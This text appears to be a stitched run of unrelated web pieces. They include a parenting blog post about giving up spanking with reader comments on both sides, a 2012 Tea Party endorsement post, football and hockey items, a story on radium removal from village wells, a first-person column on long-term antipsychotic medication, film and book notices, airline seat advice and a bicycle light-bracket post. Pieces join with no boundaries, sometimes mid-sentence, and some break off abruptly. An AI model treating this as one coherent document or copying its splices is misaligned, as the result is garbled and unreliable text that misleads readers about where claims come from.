Then it was my turn to cry. Being the cause for his tears broke my heart. Right then and there, I made a decision: I don’t want to continue the history of spanking in my family. I hated how it made me feel, and it goes against everything I believe in about gentle parenting.
Yes, it can be really frustrating to deal with a little boy who can’t contain his energy and tests my limits, but answering that innocent exuberance with spanking is not the solution. His boundary testing is only a phase, just like when he put everything in his mouth as a baby.
If I want him to learn to treat people nicely, and want him to understand that hitting others is not acceptable to me, I need to model the behavior I expect from him. The next time my son pushes my buttons, I hope to remember how terrible spanking him made me feel and find other ways to deal with the situations.
Another parenting lesson learned: spanking is not for me.
{I haven’t spanked L since this incident, over a year ago, and don’t anticipate I will again.}
What are your ways of disciplining your child? What works for you? Please share your thoughts so we can all learn from each other.
Before you comment, please keep in mind that these are all just my opinions. I didn’t say people who spank are terrible parents — I said spanking in terrible parenting in my opinion. If you decided to circumcise your boy(s) and are happy with that decision, that’s your business. You get my gist.

I am going to play devils advocate and defend the practice of spanking. I was raised by my aunt and uncle in a strict Irish Catholic home in SC. My aunt being an old fashioned Southern woman believed in the saying “Spare the Rod Spoil the Child”.Rule number one is never spank out of anger or frustration as the author of this blog post did. My aunt never spanked me or my cousins out of anger. Before we were spanked, we were told why were were getting it, the spanking itself and afterward hugged and reassured that just because we got spanked doesnt mean that we are any less loved and the slate was wiped cleaned. I got a lot of spankings growing up and Im thankful for my aunt for caring enough to discipline me. I am not emotionally scarred nor do I feel the urge to become violent with people. My aunt passed away in 1999 and after that I came to live with my mom and at her hands I did experience physical abuse.. I spank my son when he needs it and Im not ashamed to say that I do. I also use other tools such as taking away things and grounding him. Time outs never did work for him. I think the problem with alot of kids today is that parents want to be their kids friends and not their parents. Kids today are more disrespectful than ever and many parents are too afraid of CPS to disicipline their kids in any manner. Not every child needs to be spanked.. Ive met some kids who have neve been spanked and are good kids. Ive met others that were complete spoiled brats. I have read about AP parenting since before my son was born. I respect a parents right to raise their child as they see fit, but in my personal real life experience children who are raised in this manner are often clingy because their parents are too overprotective, wanting to shelter their kids from the world and keep them in a bubble so they want be exposed to germs etc. Children grow up and keeping them in the bed with you and your spouse and breastfeeding them until elementary school seems a bit much for me, but Im not going to call someone who does that a terrible parent or say its terrible parenting.. I do wonder how this generation of children will turn out though as it seems to me to be nothing more than a passing fad in parenting. Time will tell. For me parenting isnt following a particular style or dogma, its about balance and common sense. Spanking for us is merely a tool in the toolbox of discipline options when our son acts out. Ive been criticized my some women in my community who practice AP for not conforming with what they thought was the right and only way to parent. From everything from bottle feeding to letting him CIO when it was the only way to keep my sanity, to letting him sleep in his own room and the epitome came when he was 7 or 8 months old and I was told that we were not welcome at a storytime playgroup at the local library because I FF and it was for “BF” moms and babies only. Never did the playgroup or mom groups after that. All I remember is packing him and the diaper back up and walking home pushing his stroller with my head hung down in shame. I dont think AP is terrible parenting it wasnt for me and its not for others. The author who said that spanking is terrible parenting is calling parents who spank terrible parents even though she claims that isnt the case. I see alot of kids who are unruly, disrespectful in public and their parents dont do a darn thing about it. They just sit there acting like nothing is going on.. this unnerves me especially in a resturaunt where I pay good money for my meal. For some of those kids a good spanking might not be a bad thing, or better yet just remove the child. I have on more than one occassion asked to be moved and one time demanded my money back for the meal because of an unruly child. When I was little this was uncommon as most kids knew they would get a spanking if they pulled such antics. Children were much better behaved when I was younger than they are today. We are raising a generation of spoiled, selfish, disrespectful kids who think the universe revolves around them and they are entitled to everything there hearts desire. We blame their behavior on ADHD and drug them like zombies when maybe all they really need is some type of old fashioned discipline, guidance and structure in their lives.
I just realized that Dagmar wrote this..sorry I dont mean anything personal..I thought it was taken from another site written by another author and was being shared with permission.
Hi – I loved this post and I salute your decision to not hit your child. Spanking is hitting. I don’t like it when parents sugar coat the work hit by referring to it as spanking, It is hitting. Mounds of peer-reviewed research shows that spanking does not work. There is valid & reliable information about which type of parenting produces certain types of people. Active parenting is a good simple on-line course about common sense parenting and also having
fun with your family & child. thanks, Dagmar!
Dagmar, it sounds like you’ve learned something from this experience: not to spank. I was spanked as a child by both parents. As an adult I looked back with resentment, then later realized that they did what they thought was the moral thing to do, and I forgave them.
When I had children of my own, I spanked my first two at times. But when the third one came along (much later in life) I don’t recall spanking at all. To this day she (# 3) and I have bonded more tightly than the others, who are now grown and on their own.
Follow your own heart and keep doing what you know to be right for your precious child. It will pay off in the end.
I grew up getting spanked a LOT and most of the time it was unwarranted. If my parents had just taken the time to talk to me that would have solved so much more than just expecting me to blindly obey “the first time, cause I am the mom and you are the kid. Period.”
So I vowed to treat Lizzie with more respect than I was given, and i have. But I admit, I fall and have slapped her but and her little hands before. Each time I do her eyes get big and she wants me to kiss her owie. It breaks my heart. I am proud to say I am overcoming my upbringing though!
Thank you for this wonderful post Dagmar!
It is so difficult to change the way we are programmed during our childhood (like lack of emotional restraint like during spanking) but it is worth it for our children. I struggle with this myself as I was spanked as a child and I find myself lashing out to this day instead of expressing negative emotions more appropriately. I was taught how to deal with frustration and anger with violence, which is what spanking is: lashing out with violence in order to regain control. I absolutely loathe this about myself and have to consciously work at regulating myself differently so that I can be a better model for my son. What has helped me was were the exercises in the book Mindful Motherhood: Practical Tools for Staying Sane During Pregnancy and Your Child’s First Year by Cassandra Vieten.
I grew up being spanked when I misbehaved. It worked for me, and didn’t work for my sister. I think it depends on the child. I have no scarring or feelings of being distant from my parents because I received spankings for bad behavior. I think it depends on the child and the childs temperament.
For my two year old son, spanking doesn’t really make any difference to him. I have spanked him before to get his attention and he just looks at me, not realizing WHY he’s being popped. When he misbehaves, I’ve found that getting down on his level and explaining–in his terms–what he’s doing is wrong gets to him. And timeout is very effective for him.
As he gets older, we’ll adjust according to what works. I personally don’t think that spanking or not spanking makes you a better or worse parent. But I DO believe that spanking is effective in certain kids. And when done the right way, there is no long term harm.
I disagree with the ‘no long term harm’ comment. I think that the harm it causes is difficult to pinpoint because it is all psychological. What I have noticed both in myself and in the children I have studied during my college program in Early Childhood Education that have been spanked is a lack of emotional control later and difficulty expressing negative feelings appropriately. A good example is how you yourself have used hitting as a way to control your child instead of focusing on the cause of the behavior and addressing it without coercion or violence. How do you deal with intense emotions yourself? Do you yell, hit a pillow, hit another person (like spanking a ‘disobedient’ child) when you are frustrated? It is subtle the effect spanking has on the psyche but it is definitely there. I think most people don;t realise the effect it has on them when they claim that they were spanked and they’re ‘fine’, because they really are not.
Ah the terrible 3s – that’s what my daughter is going through at the moment!
I am totally anti-smacking. I do not think there is any situation in which it is okay and I don’t think spanking a child is an effective form of punishment at all. All smacking teaches a child is that hitting someone is okay. Ultimately when you smack a child you are hurting them – surely that is wrong?
I think losing control so you lash out at your child because you want to teach them a lesson is the worst kind of smacking, because that is when people can really hurt their children.
We’ve all been there they push you to the limit. A friend of mine smacked her son once as she was really angry with him, she felt so guilty just like you did and has never done it again.
I got the occasional smack when I was younger from my mum, a single parent. I have never understood pulling a child’s underwear down to smack them – is it to cause maximum pain or humiliation? One time when I was young I was playing up on the street in our village My mother did just that.
Smacking is now illegal several European countries and I wish they would do the same in the UK. I now live in SIngapore and have seen Asian dads hit their children on several occasions on the street. It horrifies me.
In terms of discipline, I use time out, to give me the chance to calm down too! I’m not the perfect parent, I don’t always get it right and end up shouting which is also not the right thing to do!
Time out never did work for my son or maybe I just didnt have the patience to take 5 or 6 hours to get him to sit for 2 minutes. Spanking can be an effective tool when applied properly and spanking out of anger is not the way to do it. Not every child needs to be spanked and some do fine without it. Others it does work.
I don’t really have any suggestions for you, I only wanted to say I feel your pain! I am going through the exact same thing right now. My son turns three in a few months and he is acting out! I don’t believe in spanking either and I haven’t done it, but I have come close. I find that if I remove myself from the situation for about 10 seconds and breath that helps. I wholeheartedly agree that you can’t teach your child to not hit by hitting them. What is that teaching? I do get frustrated though, because timeouts don’t seem to help. When I put him in timeout, he laughs. But, at least he will sit there until I tell him it’s okay to get up. If it’s any consolation I did read that this type of behavior subsides around the age of 4. Hang in there and good luck to all of us!

Tea Partiers Upset Incumbents: Brad Wenstrup, James Bridenstine, and Ted Yoho
Cross Posted from my website:
This election cycle, three incumbents were defeated by Tea Partiers and conservatives. Now these incumbents are by no means RINOs, but they were benchwarmers who refused to fight for conservative values…yielding to many RINO causes and the establishment. The Tea Party, made up of regular folks, defeated three incumbents this election cycle with a message: They are sick and tired of go-along, get-along politics…compromising of values…and the refusal of Republicans to stand up for anything. Next congress, if these tea partiers win their seats this November and they keep their promises, conservatives will add three more strong voices. Let’s learn about each one of these Tea Party upsets!
Dr. Brad Wenstrup (R) defeated Incumbent Rep. Jean Schmidt (R-Ohio 2) on March 6, 2012 by 49-44%. A supporter of the tea party, Brad Wenstrup attacked Rep. Schmidt for compromising on the debt ceiling and vowing to stand up for conservative values if the voters elected him. Rep. Schmidt holds a 72% from the conservative Heritage Action for America and an 80% from the fiscally conservative Club for Growth. But her support for raising the debt ceiling (as you can see by clicking on the article below) nailed her political coffin shut as voters told her it was time to come home. Brad Wenstrup is a practicing physician who also served as a Lt. Col. in the United States Army Reserve. We give him our endorsement and look forward to helping him win in November.
Local Tea Party Support: Anderson Tea Party
“Wenstrup billed himself as the tea party candidate, collecting endorsements from groups like Liberty Alliance Cincinnati and the Ohio Liberty Council and railing against Schmidt’s vote in favor of raising the debt ceiling.”
Brad Wenstrup’s Website:
Jim Bridenstine (R) defeated Incumbent Representative John Sullivan (R-Oklahoma 1) on June 26, 2012 defeating the incumbent 54-46%.
Video: Jim Bridenstine says that voters are tired of both parties wasting money as he upset Rep. John Sullivan (R-Oklahoma 1).
Rep. Sullivan has earned himself a 68% from the Heritage Foundation and an 80% from the Club for Growth, and Rep. Sullivan voted for the final debt ceiling increase. Sullivan also supported the NAT Gas Tax Act….Bridenstine does not. We give him our endorsement and are proud to support him for the general election.
Jim Bridenstine’s Website:
Ted Yoho is the most recent upset as he defeated Incumbent Representative Cliff Stearns (R-Florida 3) by 829 votes on August 14, 2012. Ted Yoho is a strong conservative and proudly wants to eliminate the Department of Energy. Watch his tea party speech here:
Ted Yoho Tea Party Speech on June 10, 2012
Rep. Stearns served a decent term. He actually voted against the Budget Control Act of 2011 and scored high 80s from the Heritage Foundation and the Club for Growth. But Tea Partiers and Conservatives send a message that they want and expect better. They elected Ted Yoho on primary day, and LLPH is proud to endorse him for the general election.
All in all, the Tea Party has had other successes this year. If everything goes right, tea party conservatives like Tom Cotton, Thomas Massie, Ron DeSantis, and others will be giving the few conservatives in Washington D.C. backup. My best advice for these candidates are to stand strong and not join the go-along, get-along team.
LLPH endorses these three great conservatives and wish them the best this November 2012.Bitter Pep Guardiola seeks revenge rematch between Bayern and MLS All-Stars next summer [SBNation]
Pep Guardiola was pretty ticked off at the rough tactics the MLS All-Stars used in their ‘friendly’ against Bayern Munich.
So much so that he wouldn’t even shake the opposition manager’s hand, persistently ignoring Caleb Porter’s attempts to make peace.
Rather than forgetting about the game, Guardiola apparently immediately sought revenge, with quotes reported by SB Nation.

If he’s getting this worked up about a friendly we can expect to see Guardiola blow a fuse at some point in the new season as teams try to frustrate the German champions.MARSHALL COUNTY, Alabama - Two people were displaced this morning when fire destroyed their Union Grove home, according to a report on WAFF Channel 48.

Elburn Approves Water Treatment Plan for Wells
Mellema, Darryl, Daily Herald (Arlington Heights, IL)
Byline: Darryl Mellema Daily Herald Correspondent
When Ron Dollar from WRT, LLC first called Elburn mayor James Willey to discuss his company's system for removing radium from village wells, Willey thought he was being called by a radio station and didn't immediately return the call.
Dollar, vice president of marketing at Water Remediation Treatment (WRT) and Willey eventually discussed WRT's proposal for removing radium, and determined that Dollar's company had something positive to offer Elburn.
Monday, Elburn's village board unanimously approved a 20-year lease with WRT and disposal company RMD Operations LLC to operate their radium removal process in two and eventually three of the village's wells.
"We had, as a board, come to a consensus that ion exchange was our only viable option," Willey said. "When we came across (Dollar's) proposal and they rushed a pilot plan out here to prove they could get the radium out of the water, we all looked at this and said that we had to look at this. Everything's gone well since we've done that."
The agreement involves the village's Well No. 3 , 714 N. 1st St., Well No. 4, 399 E. North St., and the now under construction No. …The talented Hedi Slimane has teamed up The Corner to create the second installation of the “I Love USA” series of films.

I said in my preview/prediction that all the Green Bay Packers needed to do today to beat the Kansas City Chiefs was show up. Well, they didn't. And the 13 game in-season winning streak, the 19-game winning streak going back to last season, has come to an end as a result. The Chiefs beat the Packers 19-14 today in Kansas City.
To be fair, it was apparent the Chiefs wanted this game more than the Packers did. They played with more intensity on both sides of the ball all day long. Yes, Kansas City had multiple trips inside the red zone into the 4th quarter and only came away with field goals. But the defense had no pass rush at all and Chiefs' receivers had no defenders within 10 yards of them most of the day.
Of course, the Packers offense was out of whack, as well. Receivers were dropping passes left and right. QB Aaron Rodgers was under assault in the pocket every time he dropped back to pass. Even head coach Mike McCarthy's play calling seemed off. The only drive that even remotely resembled the typical Packers' offense didn't occur until the last few minutes of the game. And, I don't know about you, but one of the early warning indicators for me about a pending Packers' loss is when Mason Crosby misses field goal attempts early. Yes, they were 50-yards plus, but still, we know Crosby can make those, too.
Anyway, perhaps ending the perfect season talk now will get the team refocused. In this case, it's focusing on the Christmas night game at Lambeau vs. Da Bearz, who got beat badly by Seattle today.
One of the concerns going into that game, though, will be the health of the offensive line. LT Marshall Newhouse, again replacing the injuried Chad Clifton, was beaten like a rented mule most of the day by the Kansas City pass rush. Starting RT Bryan Bulaga came up with a knee injury and didn't return to the game. His replacement, rookie Derek Sherrod, was also injured and wound up being taken off the field strapped to a cart with an air cast on his right leg. Not good.
In his post-game comments, coach McCarthy said rightly that "the opponent outperformed us." Every which way, that's for sure. It was a sad way for the winning streak to come to an end. But, if this is the type of team we all think it is, it's an opportunity for another streak to begin. Better to lose today than against Da Bearz or Lions. Perhaps it will re-light the fire under the team.
The Packers didn't secure the playoff homefield advantage they sought today. But they can do so against Da Bearz next Sunday night. Now, wouldn't that be a great Christmas present? You bet. Bring 'em on.
Go Pack Go!!!

Chiefs wanted it more: Packers winning streak ends

ON MENTAL ILLNESS: Thirty Years Medicated
Antipsychotic medication, over time, affects brain structure. When, like me, you have been on medication thirty years, (nearly all of my adult life) medication becomes a factor in how the brain develops.
Make no mistake; Schizophrenia is a very pernicious illness. Not treating this illness has a much worse effect on someone's development compared to the problems that come with treatment.
The physical side-effects of antipsychotic medication seem worse than limitations introduced to cognition. Physically, you can get "Parkinsonian" symptoms, which are parallel to having Parkinson's. This is because antipsychotic medications block neurotransmitters such as Dopamine. Parkinsonian side effects are the tip of the iceberg of medication side effects. I do not have space here to cover them all. (Medications are prescribed to help with side-effects, yet they have side effects of their own.)
However, it has been my experience that meds don't reduce intelligence. If anything, they help with intelligence by reducing psychotic symptoms which would otherwise interfere with intelligent thinking.
Some medications, for some people, can interfere with concentration, and can make it very uncomfortable to read or to do tasks that exert one's mind. This is not the same thing as reducing intelligence. The intelligence still exists albeit could be hampered at some tasks. Depending on the dosage of antipsychotic meds, how long they have been taken, and other factors, it is possible to push past this difficulty concentrating. In the long term, if you do things that intensively use the mind on a regular basis, you will probably eliminate the difficulty by means of exercise.
Lack of exercising your mental capacities will make them more likely to wither away. If you take medication but do not stay active, you might lose mental capacity due to atrophy of the brain. However, even for someone without a psychiatric illness who never needed or took psychiatric meds, lack of using the brain can cause the brain to lose functioning.
It has been my experience that medication doesn't block mindfulness, meditation or spirituality. Being in a psychotic mode (due to lack of medication) will completely prevent you from practicing meditation--I can almost guarantee that. Achieving meditative "attainment"--which is a word that describes some degree of being "enlightened"--is more difficult for someone with mental illness than it is for a non-afflicted person, but most of this added difficulty isn't caused by the medication.
(The quest for meditative attainment is quite a challenge for anyone, mentally ill or not, and any progress, even a little bit of progress, is valuable.)
After thirty years on antipsychotic meds, I can no longer work at a full-time job, an ability I once had in my distant past. I can not handle physically demanding situations. I can't do tasks that entail moving fast.
Because of the combination of the medication and relapses of the illness, it is likely that my brain is prematurely aged. For one thing, I experience some amount of memory problems. However, some of my problems are hard to distinguish from the normal effects of aging.
Going on and off medication on a repeat basis is very bad for the brain. If medication is needed, you should take it and keep taking it. Going off medication and then relapsing is a shock to the brain cells. When medication is reinstated and reality is restored in the mind, you may realize you've had quite a big setback.
With every relapse into severe psychosis, gray matter is lost. Medication has some effects that may be bad for the brain, but if medication is needed, then doing without it is far more harmful.
You wouldn't expect that you would pitch at the World Series if you had two broken arms. Those arms need to be put in a splint and allowed to heal. The same goes for your brain--medication is equivalent to a splint.
In another analogy, if you had diabetes, you would want to take diabetes medication to prevent damage to your organs as well as other life-threatening problems. Medication to treat psychosis prevents brain damage to important parts of the brain which occurs through an episode of severe mental illness.
I have been on heavy dosages of antipsychotic meds for thirty years now. If medication were really that bad for me, I wouldn't be able at this point to go to the store and buy a loaf of bread, much less write this column. Being heavily medicated on a long-term basis apparently isn't nearly as bad for me as it would have been if I were determined not to take medication. Many people may mistakenly ascribe some cognitive problems as being caused by medication that are actually caused by the illness.
After thirty years on medication, certain things don't function as well as they did when I was in my twenties. However, I can say that my logical thinking ability is better than it ever was. I have had nearly eighteen years recovery (since my last relapse due to stopping medication) under my belt. This has allowed a brain that's mostly very good to recover and to serve me well.
Author's note:
It is a shame that the medications that help us stabilize have so many side effects that ruin our health as well as inducing physical and mental suffering. Assuming that there is no hidden agenda, we need more research to invent medications that work for us without ruining our lives in the process.

Producers are out to Sigourney Weaver to play the ruthless leader of the Shadowhunters in ”The Mortal Instruments: City of Ashes”, due to film in October.
Weaver, who has been working busily the last few years, appearing in everything from the Taylor Lautner dud “Abduction” to “Cabin in the Woods” (though uncredited), would join Lily Collins and Jamie Campbell Bower in the Constantin sequel.
“Ashes” would continue the story “of a girl (Collins) who discovers she is a demon-slaying Shadowhunter and enters a world filled with warring vampires, werewolves and faeries, while also falling for another Shadowhunter (Bower)”, says The Hollywood Reporter.
Weaver’s character, the aforesaid leader of the Shadowhunters, is out seek revenge on the man that killed her son.
Harald Zwart, who directs next month’s “City of Bones”, would reprise his role as director.

Beal excels in first start with Sooners
But they might not have noticed that the guy who popped Oklahoma State's quarterback — OU defensive end Jeremy Beal — played pretty well the rest of the game, too. A redshirt freshman from Carrollton, Texas, Beal knew Saturday was going to be the first start of his career, a long way from where he started the year as a third-string defensive end. "For such a young guy, he really came on and did some really good things,” OU head coach Bob Stoops said. Defensive ends John Williams, Auston English and Alan Davis were out of Saturday's game because of injuries suffered at various times this season. So Beal's performance came just when his team needed it. Beal had 10 tackles in 10 games prior to Saturday, but accounted for five stops against OSU. Beal helped provide a consistent pass rush that the Sooners had lacked in two previous games without sophomore English, the Big 12 Conference sacks leader. But it took some time for Beal to settle in. "Anytime you get your first start in college football, you're gonna be anxious,” Beal said "But I calmed down after the first couple plays. I got into a groove and felt pretty good. "I didn't play to the best of my ability, but I played good for my first start.” By Scott WrightAllDigital used HP StoreAll 9000 Storage to deploy a scalable storage system with robust performance to handle business growth, and accommodate unstructured data growth.

Some films are an absolute treat to find and 'The Great North Korean Picture' Show is definitely one of them.Myrocia Watamaniuk, International Programmer, Hot Docs
A unique look at the creation and perpetuation of propaganda.The Argentina Independent
Directors' statement
In 2008, our documentary, ‘Aki Ra’s Boys’ was invited to the Pyongyang International Film Festival. There, we got a glimpse of a film industry like no other. The North Korean movie stars and directors we met spoke about serving their country and crafting messages that would glorify their leaders. They told us about their roles as creators of propaganda, and about their General, Kim Jong-Il - genius of film, theatre and music.
We were intrigued and wanted to find out more. But we were not interested in shooting on the sly. We wanted access - proper access - that would allow us to interact with our subjects openly and candidly, over an extended period of time. We wanted to meet the people behind the propaganda, understand their motivations and get to know their personal stories.
It took us more than half a year to secure this access and when permission was finally granted, we were told we had to agree to a few rules. Some were not easy to swallow and we had to think hard about them. Should we say yes and risk being accused of making a film that was less than objective, or decline and have the door close on us?
In the end, we decided to go for it. Over a year, we made four trips to Pyongyang. They were all logistically difficult to arrange. It was hard to know if a visit would be our last. Still, things got easier with time. Our subjects became less reserved, our guides, more flexible. We learnt that it was important to keep an open mind, to demonstrate that we respected our hosts and to let them show us, rather than to demand to be shown.
Some people have suggested that our subjects were merely putting on an act. Maybe they were told to be on their best behavior, but we hope that by being patient, by stepping back, and by being as unobtrusive as possible, we were able to capture moments when they were their genuine, unadulterated selves. What is the truth? What is real? All we can say is we opened a door, walked in, and observed. Did we succeed? The audience will just have to watch and decide.

“[Chilton’s] inviting prose, ability to recreate the cultural contexts of Paul’s life and deep affection for the Apostle bring new life to a tale that has been
told many times before.”—
Publishers Weekly
ANNANDALE-ON-HUDSON, N.Y.—The Rev. Dr. Bruce Chilton, Bernard Iddings Bell Professor of Philosophy and Religion and executive director of the Institute of Advanced Theology at Bard, will speak about his most recent book,
Rabbi Paul: An Intellectual Biography
, on Thursday, October 7, at Bard College. The program, presented by the Institute of Advanced Theology at Bard College, is free and open to the public and will begin at 5:30 p.m. in the Weis Cinema of the Bertelsmann Campus Center. A book signing, presented by Merritt Books, will follow the lecture.
“Without Paul, there would be no Christianity. His letters to various churches scattered throughout the Roman Empire articulated, for the first time, the beliefs that make up the heart of Christian practice and faith,” explains Chilton. In Rabbi Paul, Chilton describes the changing images of Paul, from the early church period—where he was regarded as the premier apostle who separated Christianity from Judaism—to more recent liberal evaluations, which paint him as an antifeminist, homophobic figure more dedicated to doctrine than). His most recent book is Rabbi Paul: An Intellectual Biography, 2004..

We are flying Virgin Atlantic from Heathrow to Miami. What three seats would you recommend? Economy only unfortunately.
Some of our staff members are big or tall, and a few are both, so we certainly understand your concerns to be as comfortable as possible on the long flight.
The best choice for your family of three is probably to go for the pairs of seats along the rear fuselage on the Boeing 747-400 serving your route. Due to the tapering of the fuselage, there is not enough room for the standard three seats at the last few rows. This means that there is no middle seat, just a window and aisle, so these are naturally more comfortable.
However note that their location near the back of the plane also has its negative points:
- Later meal service, which means they might not have your choice of meals available
- Last to deplane, hence longer queue at Immigrations
- The further back on the plane you sit, the more sideways motion you are likely to experience during turbulence
- You are more likely to be seated amongst tour groups or families traveling with children
- Sometimes the bins above the last few rows are used for emergency equipment, making it harder to find overhead bin space
Also, depending on the specific row, the window seat is mounted farther from the window than normal, making it a little harder to see out. This also means that there is some room to put your personal belongings between the seat and the fuselage.Comment: Re:From the Article... (Score 1) 199

That's the theory. I got the 5.0 OTA update for my 2013 LTE Nexus 7 in mid-Februrary, some two weeks before I got 5.0 on my Z2.

Buffalo Sabres General Manager Darcy Regier announced today that forward Marcus Foligno has been recalled on an emergency basis from the Rochester Americans of the American Hockey League.
In his first professional season, Foligno (8/10/91, 6'3", 227 lbs) is tied for second in scoring on the Americans with 34 points (14+20) and 70 penalty minutes in 55 games.
A native of Buffalo, NY, Foligno will join the Sabres on his fourth career recall after being selected by the Sabres in the fourth round (104th overall) of the 2009 NHL Entry Draft.I took a time out in the shop this morning to make some new light brackets. The only thing better than caffeine in the morning is jumping out of bed and making an idea into reality with your hands, at least for me. The idea of chain ring light brackets is not new, a little google-fu will get you some results like this:
Working from this as a starting point, I went through my piles of old chain rings and decided that the diameter of chain rings in the mid to high 20’s best matched the shape of the headlight. After a bit of cutting, filing, and polishing this is what I came up with:
I am pretty happy with the way they came out. Both lights will be mounting to a Nitto Mark’s rack, in different ways, so I made two different length brackets.
Backing up a bit for those not familiar with these types of lighting systems, one is likely to ask why even make a bracket? Why not just mount it upside down? The lights are made with a fairly advanced optic that focuses the light in a rectangular beam with a cutoff that keeps the light on the road and out of the eyes of oncoming traffic. The optic housing interface is further designed to be most water-resistant in the upright orientation. This all works out fine for 90% of the intended audience who mount these lights to the fork crown of an average city bike. The challenge starts with the crown mount location when you use a front bag or basket. The lights beam is obstructed in the competition for real estate. So a bracket needs to be used to move the light under the rack and forward so that the light is not blocked by the front wheel or hanging out in a spot where it can be easily damaged. Surprisingly there is not much on the market to solve this problem.
I am waiting for some additional hardware to be delivered so I can keep this project moving. Later in the week I should have this much further along.
Great great idea! I bought a used handmade mixte a few months ago and have a SON28 on it – I think your idea is ingenius! I’d love to purchase some of these brackets when you get to that point.

Rob – have you seen the “hanging attachment” type of eDelux that Compass Bicycles carries?
You can read more about it here (summary: Jan Heine worked with Schmidt Maschinenbau to develop an “upside down” mounted version – NOTE it lacks a tail light connector and the daylight sensor)
The hanging edluxe is the business, but the price point is a bit high for many people IMO. The B&M Cyo line will get you pretty close to there for almost half the price, and the Lyt line is really better than most people have ever had with a battery light and hits the street at $30 or less. The problem with the later two is the shape of the plastic housing for the under-mount and the fact that they would need a complete redesign for the inverted mount. Thus the bracket hack.
I know the eDelux is pretty sweet, but to get more people out, particularly at night, better easy lights will help. In urban and suburban settings a Lyt mounted well, under a wald basket would go a long way in keeping people on their bike for those rides under 5 miles.
As an aside, the beauty of these systems is choice, sweet Son hub or nice Shimano. eDeluxe or Lyt. There is a range of approachable price-points and solid performance that the LED and dynamo tech is bringing to the table. The Rambler will work gracefully with any combination, you can build it up top of the line, or go shimano and Lyt as you personal budget dictates.Trick Daddy
In case you didn't already know, the mayor of Miami is not always Manny Diaz. Although Diaz is a nice fellow and knows a lot about politics, he can handle only so much authority and essentially presides over the city from 8 a.m. to 5 p.m. But as nighttime approaches, Diaz's power ceases to exist and the one and only Trick Daddy takes ownership, which is why he's known as the real mayor of Miami.
And who are we to tell him any different? After 2 Live Crew fell from prominence, Trick Daddy single-handedly kept Miami hip-hop on the map and helped build Slip-N-Slide records into a local, then regional, and then national powerhouse. He has since parted ways with Slip-N-Slide (friends and money make strange bedfellows), but he's still rapping and representing the MIA to the fullest. This Saturday, Trick Daddy and his Dunk Ryder crew are taking over Sobe Live and hosting the biggest hip-hop party of the weekend. Lots of industry heavyweights should be stopping by — and if you like your hip-hop music loud and hood, then Sobe Live is definitely the place”Moving parts -- with three hours to go
It appears that Chad Cordero's destiny, and even that of Jon Rauch, could be tied up in the fate of the other key reliever on the market, Texas's Eric Gagne. The Mets and Red Sox appear hottest on him. The price for Gagne -- because of his age and injury history -- might be less than that for Cordero. He has a no-trade clause to several teams, including the Red Sox (but not the Mets). He'd have to waive that to go to Boston.
Clearly, Boston's Wily Mo Pena is shoppable, and he has a well-documented history with Washington GM Jim Bowden, who acquired him from the Yankees when he was the GM in Cincinnati. But Pena's numbers and performance now (.229, 5 HR, 54 strikeouts in 140 at-bats) would not be near enough to land Cordero or Rauch straight up. The Sox would have to throw in some of their minor league studs like Clay Bucholz and/or Jacoby Ellsbury (who would address the Nationals' most significant long-term need, center field). All reports out of Boston, however, have indicated those guys are untouchable.
Mets now appear to be out of running on Gagne, I'm told from someone up there. That might mean an 11th-hour push for Cordero and/or Rauch. Phil Humber, a Mets pitching prospect who could interest the Nats, was pulled from his scheduled start last night and then again scratched today for Class AAA New Orleans.
Not sure on Detroit, who seemed far away from a deal for either Cordero or Rauch last night. Still intrigued by that Arizona thought. And yes, you saw what Tim Brown of Yahoo! had -- Carlos Quention. That's precisely the piece I had heard. He hasn't played center, so he wouldn't solve that problem, and he's hitting just .209 in part-time duty, so there'd have to be another significant body involved if they were to deal Cordero there.
We're getting down to it, and I'm going to get out to the park.
Oh, a couple other things:
1. John Patterson is at RFK Stadium today, back from his treatment in Toronto. I look forward to talking to him about it if he's still around.
2. Thursday is the 100th anniversary of Walter Johnson's debut with the Washington Senators. Pick up the $.35 edition tomorrow. I'll have a story on the occasion there, and the Nationals are planning some pregame ceremonies, which hopefully will be cool.
3. Friday against the Cardinals is Negro Leagues Tribute Night, and Josh Gibson's great-grandson will throw out the first pitch.
Catch up with you from RFK.

'In recent years Ted has added an array of Gibson Custom Shop Les Pauls to his quiver of guitars.
Who’s the last guitar player that blew you away?
God, there’s so many. You know I got to jam with the best. Chris Duarte and Joe Bonamassa and and right up there with those guys is (Ted Nugent band member) Derek St. Holmes. He is just such an underrated guitar player. He is a monster soulful player. Monster lead player, monster creativity player, monster jazz fusion and blues. So they all have a wonderful unique vision, touch, and musical statement. They’re all virtuosos. It’s always stimulating. I played with Bugs Henderson many, many times before he passed away. And I did a jam session one time in somebody’s booth one time with John Entwistle. It was off the charts. I played with Eddie Van Halen and Johnny Winter and Rick Derringer and Brian May and Billy Gibbons. I’ve played with the best of the best. Ronnie Montrose. I’ve been to the mountain top. I actually played bass guitar for Bo Diddley and Chuck Berry one year. So I’ve been to the mountain top, man. But recently? I was with Gary Hoey on That Metal Show and he still fire-breathes. There’s so many. They’re all so unique. And if you have an open mind and an appreciation of individual musical statements, which I am always mesmerized by, you can appreciate all of them.
What was it like playing bass with Chuck Berry and Bo Diddley? I have to ask.
Out of body on two levels. Number one, because if you’re going to play with a rock and roll god, they’re the two. I suppose if I played with Little Richard and Jerry Lee Lewis or Elvis it would have been as good. But they’re two of the gods. On one level it was so exciting. Unfortunately, I think you’ll get this if you talk to any of the musicians who have been honored to be sidemen for these great legends, I knew their songs better than they did. They were tired at the time and I mean no disrespect, but they seemed tired and somewhat bored with those songs because they had played them so many times and didn’t have enough of an escape departure like my hunting or my farming and ranching which my outdoor lifestyle provides to me. If you don’t cleanse yourself of the musical outrage, which all of this wonderful music is outrageous, if you don’t get the f**k away from it, that garage band hunger goes away I think. That’s what I’ve witnessed with so many of my peers and my heroes out there. But because I escape the music totally and thoroughly with my primal scream hunting with the bow and arrow and wild-life management, training hunting dogs, running trap lines, and planting trees and crops and working on trucks and tractors. When I draw my bow back, there’s no such thing as a guitar. I’m going back to the cave and the twang of the bow string is the first guitar note again.Possible Answer

JOHN SHIRK – From Second Peter 1, verse 2.
“Grace and peace be yours in abundance through the knowledge of God and of Jesus our Lord.”
This is a greeting from Simon Peter to those who had received the message of faith in the Lord Jesus. As we get to know God better, several things happen:
God’s grace and peace abundantly blesses us. We are filled with joy at the reality of His presence and forgiveness of our sins. The burden of guilt that we carried is released at the cross, and now, we don’t have to fear being condemned at the coming judgment.
God’s grace and peace also changes us, adjusting our priorities and reshaping our attitudes to reflect the image of Christ.
